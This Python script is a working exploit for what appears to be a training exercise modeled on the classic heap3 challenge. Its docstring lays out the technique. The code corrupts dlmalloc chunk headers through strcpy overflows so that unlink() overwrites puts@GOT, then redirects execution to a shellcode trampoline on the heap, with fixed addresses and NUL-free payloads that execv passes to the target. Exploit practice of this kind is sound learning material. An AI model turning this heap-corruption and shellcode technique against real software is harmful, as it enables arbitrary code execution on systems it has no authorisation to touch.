#!/usr/bin/env python3
"""
ex06 exploit  (heap3: dlmalloc unlink() write-what-where -> redirect puts).

Program (3 x malloc(0x20), strcpy from argv[1..3], then free(b3),free(b2),free(b1),
then puts("...")), with a winner() we must reach. The heap allocator (dlmalloc)
is statically compiled INTO the binary, so its behaviour is identical everywhere.

Layout (ASLR off, no PIE -> all fixed):
    heap base 0x804c000 ; buf1=0x804c008 buf2=0x804c030 buf3=0x804c058
    chunk3 header @ 0x804c050 (prev_size) / 0x804c054 (size)
    puts@GOT = 0x804b128 ; winner = 0x08048864

Technique — trigger the dlmalloc `unlink()` macro during the FIRST free (free(buf3))
via backward consolidation, using a fake chunk we craft inside buf3 itself:
  unlink(P): FD=P->fd; BK=P->bk; *(FD+12)=BK; *(BK+8)=FD      (old dlmalloc, no checks)
  -> set FD = puts_GOT-12, BK = &trampoline  ==>  puts@GOT = &trampoline
Because unlink does a *second* write (*(BK+8)=FD) and winner lives in read-only
.text, we can't point the GOT straight at winner; instead we point it at a small
trampoline on the (executable) heap that does `push winner ; ret`.

Constraints that shape the payload:
  * strcpy/argv cannot contain NUL bytes -> every dword is NUL-free.
  * frees run b3,b2,b1; firing on free(b3) avoids the later frees clobbering fd/bk.
  * free() must not crash after the unlink: we make the bogus `nextchunk` look
    in-use (odd byte at nextchunk+4) so free skips the forward-consolidation unlink.

Executable heap: a 32-bit exec-stack binary runs with READ_IMPLIES_EXEC on real
i386 Linux (the VM), so the heap trampoline executes. (ASLR must be off: the VM
default — verify `cat /proc/sys/kernel/randomize_va_space` == 0.)

Usage (VM):   python3 ex06.py /opt/hole-in-bin/ex06/bin
"""
import os
import struct
import sys

p = lambda x: struct.pack("<I", x)

PUTS_GOT = 0x0804B128
WINNER   = 0x08048864
BUF3     = 0x0804C058
TRAMP    = BUF3 + 0x10          # 0x804c068
FD       = PUTS_GOT - 12        # 0x804b11c  -> *(FD+12)=*(puts_GOT)=BK
BK       = TRAMP                # -> *(BK+8)=FD lands in trampoline padding

# buf1: unused
argv1 = b"A" * 8

# buf2: fill, then set nextchunk+4 (0x804c048 = buf2+0x18) ODD so free() skips the
# forward-consolidation unlink, then overwrite chunk3 header for backward unlink:
#   chunk3->prev_size = -8  => fake chunk P = chunk3 + 8 = buf3
#   chunk3->size      = even (PREV_INUSE clear) and NUL-free
argv2 = b"B" * 0x18 + p(0x41414141) + p(0x41414141) + p(0xFFFFFFF8) + p(0xFFFFFFFC)

# buf3: the fake chunk P (fd/bk read from P+8/P+12) + the trampoline
tramp = b"\xeb\x0a" + b"\x90" * 10 + b"\x68" + p(WINNER) + b"\xc3"  # jmp +0xa ; push WINNER ; ret
argv3 = p(0x11111111) + p(0x11111111) + p(FD) + p(BK) + tramp + b"\x90" * 8

for name, a in (("argv1", argv1), ("argv2", argv2), ("argv3", argv3)):
    assert b"\x00" not in a, "%s has a NUL byte" % name

if len(sys.argv) > 1:
    target = sys.argv[1]
    os.execv(target, [target, argv1, argv2, argv3])
else:
    # print the three args, NUL-free, one per line as $'...'-style hex for inspection
    for a in (argv1, argv2, argv3):
        sys.stdout.write("".join("\\x%02x" % c for c in a) + "\n")
